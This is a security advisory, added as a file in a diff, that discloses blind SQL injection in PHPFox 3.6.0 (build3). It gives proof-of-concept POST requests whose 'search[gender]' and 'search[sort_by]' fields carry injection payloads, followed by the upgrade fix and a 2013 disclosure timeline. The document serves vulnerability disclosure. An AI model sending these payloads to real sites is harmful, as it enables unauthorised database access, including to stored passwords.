@@ -1,0 +1,46 @@
+------------------------------------------------------------
+PHPFox v3.6.0 (build3) Multiple SQL Injection vulnerabilities
+------------------------------------------------------------
+
+== Description ==
+- Software link: http://www.phpfox.com
+- Affected versions: version 3.6.0 (build3) is vulnerable. Other
+versions might be affected as well.
+- Vulnerability discovered by: Matias Fontanini
+
+== Vulnerabilities ==
+When performing POST requests to /user/browse/view_/, the
+"search[gender]" and "search[sort_by]" parameters are not correctly
+sanitized before being used to construct SQL queries, making them
+vulnerable to Blind SQL Injection attacks.
+
+== Proof of concept ==
+
+- For the "search[gender]" parameter, using the condition "1=0" so
+that no results are returned:
+
+POST /user/browse/view_/
+core[security_token]=0db230b2a8b6755b8cfe60d97fb1a613&search[gender]=2
+and 1=0search[from]=&search[to]=&search[country]=&null=1&search[city]=&search[zip]=&search[keyword]=&search[type]=0&search[submit]=Submit&custom[1]=&custom[2]=&custom[3]=&custom[4]=&custom[5]=&custom[6]=&custom[7]=&search[sort]=u.last_login&search[sort_by]=DESC
+
+- The "search[sort_by]" parameter is inserted in a "order by" clause.
+Therefore, an attacker could exploit it by making the application sort
+the results based on a different criteria, depending on whether the
+query was successful:
+
+POST /user/browse/view_/
+core[security_token]=0db230b2a8b6755b8cfe60d97fb1a613&search[gender]=2&search[from]=&search[to]=&search[country]=&null=1&search[city]=&search[zip]=&search[keyword]=&search[type]=0&search[submit]=Submit&custom[1]=&custom[2]=&custom[3]=&custom[4]=&custom[5]=&custom[6]=&custom[7]=&search[sort]=u.last_login&search[sort_by]=ASC,(case
+when (select 1 from dual) then birthday_search else password end)
+
+== Solution ==
+Upgrade the product to the 3.6.0 (build6) version. Note that builds 4
+and 5 also contain the vulnerability present in the "search[sort_by]"
+parameter, but not the other one.
+
+== Report timeline ==
+[2013-07-30] Vulnerability reported to vendor.
+[2013-07-30] Developers answered back indicating that an update would
+be released soon.
+[2013-08-07] PHPFox 3.6.0 (build6) was released, which fixed all of
+the issues reported.
+[2013-08-07] Public disclosure.
